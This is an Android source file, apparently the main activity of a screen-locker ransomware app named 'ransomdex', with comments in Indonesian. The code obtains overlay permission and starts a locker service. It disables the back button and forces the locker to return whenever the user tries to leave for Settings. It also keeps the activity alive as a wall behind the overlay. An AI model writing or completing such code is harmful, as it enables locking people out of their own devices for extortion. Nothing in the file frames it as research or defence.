package com.bondex.ransomdex;

import android.app.Activity;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.provider.Settings;

public class MainActivity extends Activity {

    private static final int ACTION_MANAGE_OVERLAY_PERMISSION_REQUEST_CODE = 5469;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        // Hilangkan animasi masuk agar tidak flicker
        overridePendingTransition(0, 0);

        // Cek izin draw overlay (diperlukan untuk TYPE_APPLICATION_OVERLAY)
        checkPermission();
    }

    @Override
    public void onWindowFocusChanged(boolean hasFocus) {
        super.onWindowFocusChanged(hasFocus);
        if (!hasFocus) {
            // Jika user mencoba buka Settings lewat glitch, tarik paksa kembali
            startLocker();
        }
    }

    @Override
    public void onBackPressed() {
        // Blokir tombol back total
        return;
    }

    public void checkPermission() {
        if (!Settings.canDrawOverlays(this)) {
            // Jika izin belum diberikan, buka pengaturan sistem
            Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                    Uri.parse("package:" + getPackageName()));
            startActivityForResult(intent, ACTION_MANAGE_OVERLAY_PERMISSION_REQUEST_CODE);
        } else {
            // Jika sudah ada izin, jalankan LockerService
            startLocker();
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == ACTION_MANAGE_OVERLAY_PERMISSION_REQUEST_CODE) {
            if (Settings.canDrawOverlays(this)) {
                startLocker();
            }
        }
    }

    private void startLocker() {
        // Memulai service pengunci layar
        Intent intent = new Intent(MainActivity.this, LockerService.class);
        startService(intent);
        
        // Jangan panggil finish()! Biarkan dia jadi tembok di belakang overlay
        overridePendingTransition(0, 0);
    }
}